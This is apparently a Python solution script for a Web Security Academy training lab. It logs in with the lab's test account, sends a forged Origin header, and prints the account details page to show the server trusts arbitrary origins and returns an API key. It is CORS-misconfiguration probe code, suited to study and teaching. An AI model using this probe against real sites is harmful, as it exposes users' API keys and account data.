import bs4
import requests

site = "ac9d1fa71ea1c067c0621014001e0047.web-security-academy.net"
s = requests.session()

if __name__ == "__main__":
    site_url = f'https://{site}'
    login_url = f"https://{site}/login"
    login_response = s.get(login_url)
    csrf = bs4.BeautifulSoup(login_response.text, 'html.parser').find('input', {'name': 'csrf'})['value']

    login_data = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter'
    }

    resp = s.post(login_url, data=login_data)

    s.headers.update({'Origin': 'https://bradlet2.com'})

    details_url = f"https://{site}/accountDetails"
    resp = s.get(details_url)

    # View the response headers showing the Origin is echoed
    print(resp.headers)

    # Get the response containing the API key
    print(resp.text)
